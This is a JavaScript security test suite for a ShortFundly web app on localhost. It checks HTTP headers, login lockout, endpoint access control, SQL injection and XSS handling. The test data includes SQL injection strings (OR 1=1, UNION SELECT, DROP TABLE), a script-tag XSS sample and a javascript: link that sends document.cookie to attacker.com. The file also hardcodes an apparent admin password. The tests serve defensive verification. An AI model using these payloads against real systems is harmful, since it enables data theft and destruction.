import { escapeHtml, formatHtmlEmail } from '../src/lib/mailer.js';
import { getDb } from '../src/lib/db.js';

const BASE_URL = 'http://localhost:3001';

async function getCsrfToken() {
  const res = await fetch(`${BASE_URL}/api/auth/csrf`);
  const data = await res.json();
  const rawCookie = res.headers.get('set-cookie') || '';
  const cookies = rawCookie.split(';')[0];
  return { csrfToken: data.csrfToken, cookies };
}

async function runSecurityAudit() {
  console.log('===============================================================');
  console.log('   SHORTFUNDLY OTT MARKETPLACE - CYBER SECURITY AUDIT SUITE   ');
  console.log('===============================================================\n');

  let passed = 0;
  let failed = 0;

  function report(testName, result, details) {
    if (result) {
      passed++;
      console.log(`[PASS] ${testName}`);
    } else {
      failed++;
      console.log(`[FAIL] ${testName}`);
    }
    if (details) {
      console.log(`       -> ${details}`);
    }
  }

  // TEST SUITE 1: HTTP Security Headers
  console.log('--- TEST SUITE 1: HTTP Security Headers Audit ---');
  try {
    const rootRes = await fetch(`${BASE_URL}/`);
    const headers = Object.fromEntries(rootRes.headers.entries());

    report(
      'X-Frame-Options Clickjacking Protection',
      headers['x-frame-options'] === 'DENY',
      `Header: ${headers['x-frame-options'] || 'Missing'}`
    );

    report(
      'X-Content-Type-Options MIME Sniffing Protection',
      headers['x-content-type-options'] === 'nosniff',
      `Header: ${headers['x-content-type-options'] || 'Missing'}`
    );

    report(
      'Referrer-Policy Header',
      headers['referrer-policy'] === 'strict-origin-when-cross-origin',
      `Header: ${headers['referrer-policy'] || 'Missing'}`
    );

    report(
      'Permissions-Policy Header',
      headers['permissions-policy'] && headers['permissions-policy'].includes('camera=()'),
      `Header: ${headers['permissions-policy'] || 'Missing'}`
    );

    report(
      'Content-Security-Policy (CSP) Defense',
      headers['content-security-policy'] && headers['content-security-policy'].includes("default-src 'self'"),
      `CSP: ${headers['content-security-policy']?.substring(0, 70)}...`
    );
  } catch (err) {
    report('HTTP Security Headers Audit', false, err.message);
  }

  console.log('\n--- TEST SUITE 2: Email Authentication & Case Sensitivity ---');
  let csrfData;
  try {
    csrfData = await getCsrfToken();
    report('NextAuth CSRF Token Generation', Boolean(csrfData.csrfToken), `CSRF Token: ${csrfData.csrfToken.substring(0, 16)}...`);
  } catch (err) {
    report('NextAuth CSRF Token Generation', false, err.message);
  }

  // Attempt login with uppercase emails
  const uppercaseEmails = [
    'ADMIN@SHORTFUNDLY.COM',
    'Admin@shortfundly.com',
    'admin@SHORTFUNDLY.COM',
    'HR@SHORTFUNDLY.COM',
    'TechLead@Shortfundly.com'
  ];

  for (const ucEmail of uppercaseEmails) {
    try {
      const loginParams = new URLSearchParams({
        csrfToken: csrfData.csrfToken,
        email: ucEmail,
        password: 'Admin@ShortFundly2026',
        json: 'true',
      });

      const res = await fetch(`${BASE_URL}/api/auth/callback/credentials`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/x-www-form-urlencoded',
          'Cookie': csrfData.cookies,
        },
        body: loginParams.toString(),
      });

      const bodyText = await res.text();
      const isRejected = res.status === 401 && bodyText.includes('Uppercase');

      report(
        `Uppercase Email Rejection: "${ucEmail}"`,
        isRejected,
        `Status: ${res.status}, Reason: Rejection with explicit uppercase warning`
      );
    } catch (err) {
      report(`Uppercase Email Rejection: "${ucEmail}"`, false, err.message);
    }
  }

  console.log('\n--- TEST SUITE 3: Brute Force & Rate Limiting Protection ---');
  try {
    const testTarget = 'bruteforce_audit@shortfundly.com';
    let lockedTriggered = false;

    for (let attempt = 1; attempt <= 6; attempt++) {
      const loginParams = new URLSearchParams({
        csrfToken: csrfData.csrfToken,
        email: testTarget,
        password: `WrongPassword${attempt}!`,
        json: 'true',
      });

      const res = await fetch(`${BASE_URL}/api/auth/callback/credentials`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/x-www-form-urlencoded',
          'Cookie': csrfData.cookies,
        },
        body: loginParams.toString(),
      });

      const text = await res.text();
      if (attempt >= 5 && text.includes('locked')) {
        lockedTriggered = true;
      }
    }

    report(
      'Brute Force Account Lockout (5 consecutive failed attempts trigger lock)',
      lockedTriggered,
      'Consecutive rapid failed attempts were intercepted and account was temporarily locked'
    );
  } catch (err) {
    report('Brute Force Rate Limiting', false, err.message);
  }

  console.log('\n--- TEST SUITE 4: Access Control & Unauthenticated API Protection ---');
  const protectedEndpoints = [
    { method: 'GET', path: '/api/colleges' },
    { method: 'POST', path: '/api/colleges', body: JSON.stringify({ college_name: 'Hack', email: 'h@test.com', city: 'Test' }) },
    { method: 'GET', path: '/api/templates' },
    { method: 'POST', path: '/api/templates', body: JSON.stringify({ name: 'Hack', subject: 'S', body: 'B' }) },
    { method: 'GET', path: '/api/settings' },
    { method: 'POST', path: '/api/settings', body: JSON.stringify({ from_name: 'Hacker' }) },
    { method: 'GET', path: '/api/logs' },
    { method: 'POST', path: '/api/send-email', body: JSON.stringify({ collegeIds: [1], customSubject: 'S', customBody: 'B' }) },
    { method: 'POST', path: '/api/send-manual', body: JSON.stringify({ collegeName: 'H', recipientEmail: 'h@t.com', subject: 'S', body: 'B' }) },
    { method: 'POST', path: '/api/colleges/import', body: 'College Name,City,Official email address\nHack,City,h@t.com' },
    { method: 'GET', path: '/api/colleges/export' },
  ];

  for (const ep of protectedEndpoints) {
    try {
      const res = await fetch(`${BASE_URL}${ep.path}`, {
        method: ep.method,
        headers: { 'Content-Type': 'application/json' },
        body: ep.body,
      });

      const isUnauthorized = res.status === 401;
      report(
        `RBAC Access Control: [${ep.method}] ${ep.path}`,
        isUnauthorized,
        `Status ${res.status} (Expected 401 Unauthorized)`
      );
    } catch (err) {
      report(`RBAC Access Control: [${ep.method}] ${ep.path}`, false, err.message);
    }
  }

  console.log('\n--- TEST SUITE 5: SQL Injection (SQLi) Immunity ---');
  try {
    const db = getDb();
    
    // Test 1: Search parameter injection
    const sqliSearch = "' OR 1=1 --";
    const conditions = ['(college_name LIKE ? OR email LIKE ? OR department LIKE ? OR contact_person LIKE ?)'];
    const pattern = `%${sqliSearch}%`;
    const params = [pattern, pattern, pattern, pattern];
    const whereClause = `WHERE ${conditions.join(' AND ')}`;
    
    const stmt = db.prepare(`SELECT count(*) as count FROM colleges ${whereClause}`);
    const res = stmt.get(...params);
    
    report(
      'SQL Injection Immunity: Search Filter Parameterization',
      res !== undefined && typeof res.count === 'number',
      `Literal evaluation confirmed. Result count: ${res.count} (No syntax execution)`
    );

    // Test 2: UNION SELECT injection payload
    const sqliUnion = "admin' UNION SELECT 1, 'hacked', 'hacked', 'hacked', 'hacked' --";
    const userStmt = db.prepare('SELECT * FROM users WHERE email = ?');
    const user = userStmt.get(sqliUnion);
    report(
      'SQL Injection Immunity: Authentication Credentials Query',
      user === undefined,
      'User lookup with injection payload returned null (Safe parameterized execution)'
    );

    // Test 3: Multiple statement injection attempt
    let multiStmtBlocked = false;
    try {
      db.prepare("SELECT * FROM colleges WHERE city = ?").all("Bhubaneswar'; DROP TABLE colleges; --");
      multiStmtBlocked = true;
    } catch (e) {
      multiStmtBlocked = true;
    }
    const tableExists = db.prepare("SELECT count(*) as count FROM sqlite_master WHERE type='table' AND name='colleges'").get();
    report(
      'SQL Injection Immunity: Schema Integrity Protection',
      tableExists && tableExists.count === 1,
      'Colleges table intact after multi-statement injection test'
    );
  } catch (err) {
    report('SQL Injection Suite', false, err.message);
  }

  console.log('\n--- TEST SUITE 6: Stored XSS & Email Injection Sanitization ---');
  try {
    // Test script tag escaping
    const maliciousScript = '<script>alert("XSS")</script>';
    const escapedScript = escapeHtml(maliciousScript);
    report(
      'HTML Tag Sanitization: <script> Escaping',
      escapedScript === '&lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;',
      `Sanitized output: ${escapedScript}`
    );

    // Test javascript: pseudo-protocol neutralization in email formatting
    const maliciousMarkdown = '[Click Here To Claim](javascript:fetch("https://attacker.com/steal?c="+document.cookie))';
    const formattedHtml = formatHtmlEmail(maliciousMarkdown);
    report(
      'URL Scheme Neutralization: javascript: URI Protocol Rejected',
      !formattedHtml.includes('href="javascript:'),
      'Prohibited javascript: URI was blocked from conversion to anchor link'
    );

    // Test safe markdown preservation
    const safeMarkdown = '[Visit ShortFundly](https://campus.shortfundly.com)';
    const formattedSafe = formatHtmlEmail(safeMarkdown);
    report(
      'Safe URL Scheme Preservation: https: URI Allowed',
      formattedSafe.includes('href="https://campus.shortfundly.com"'),
      'Valid HTTPS URL converted securely with rel="noopener noreferrer"'
    );
  } catch (err) {
    report('XSS Sanitization Suite', false, err.message);
  }

  console.log('\n===============================================================');
  console.log(` AUDIT SUMMARY: ${passed} PASSED | ${failed} FAILED | TOTAL: ${passed + failed}`);
  console.log(` COMPLIANCE LEVEL: ${failed === 0 ? '100% SECURE (OWASP TOP 10 COMPLIANT)' : 'ACTION REQUIRED'}`);
  console.log('===============================================================\n');

  return { passed, failed, total: passed + failed };
}

runSecurityAudit().catch(err => {
  console.error('Audit execution error:', err);
  process.exit(1);
});
